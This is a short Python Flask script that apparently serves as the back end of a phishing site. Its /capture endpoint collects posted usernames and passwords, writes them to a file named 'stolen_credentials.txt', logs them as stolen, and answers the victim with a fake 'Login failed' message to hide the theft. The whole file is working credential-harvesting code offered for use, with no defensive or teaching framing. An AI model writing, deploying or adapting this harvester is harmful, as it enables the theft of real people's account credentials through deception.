from flask import Flask, request

app = Flask(__name__)

@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Log credentials to a file
    with open("stolen_credentials.txt", "a") as file:
        file.write(f"Username: {username}, Password: {password}\n")

    print(f"[INFO] Stolen credentials captured: Username={username}, Password={password}")
    return "<h1>Login failed: Incorrect username or password</h1>"

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)
